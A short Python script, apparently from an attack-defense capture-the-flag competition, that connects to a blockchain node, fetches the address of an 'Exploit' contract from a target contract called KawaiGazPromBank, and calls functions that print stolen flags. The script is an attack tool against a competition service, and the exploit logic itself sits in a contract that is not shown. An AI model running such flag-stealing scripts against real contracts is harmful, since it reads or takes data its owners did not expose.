#!/usr/bin/env python3

import web3
from web3.middleware import geth_poa_middleware
import json
import os
import sys
from checklib import *

with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'config.json'), 'r') as f:
    config = json.load(f)

session = get_initialized_session()
w3 = web3.Web3(web3.HTTPProvider(f'{config["BLOCKCHAIN_PROTOCOL"]}://{config["BLOCKCHAIN_ADDRESS"]}:{config["BLOCKCHAIN_PORT"]}', session=session))
w3.middleware_onion.inject(geth_poa_middleware, layer=0)

kawaiGazPromBankAddr = sys.argv[1]

with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'KawaiGazPromBank.json'), 'r') as f:
    kawaiGazPromBankAbi = f.read()

with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'Exploit.json'), 'r') as f:
    exploitAbi = f.read()

kawaiGazPromBank = w3.eth.contract(address=kawaiGazPromBankAddr, abi=kawaiGazPromBankAbi)
exploitAddr = kawaiGazPromBank.functions.exploit().call()
exploit = w3.eth.contract(address=exploitAddr, abi=exploitAbi)
print(exploit.functions.getBoxFlags(b"amogus", 0).call(), flush=True)
print(exploit.functions.getCoinFlags(b"amogus", 0).call(), flush=True)
print(exploit.functions.getCardFlags(b"amogus", 0).call(), flush=True)
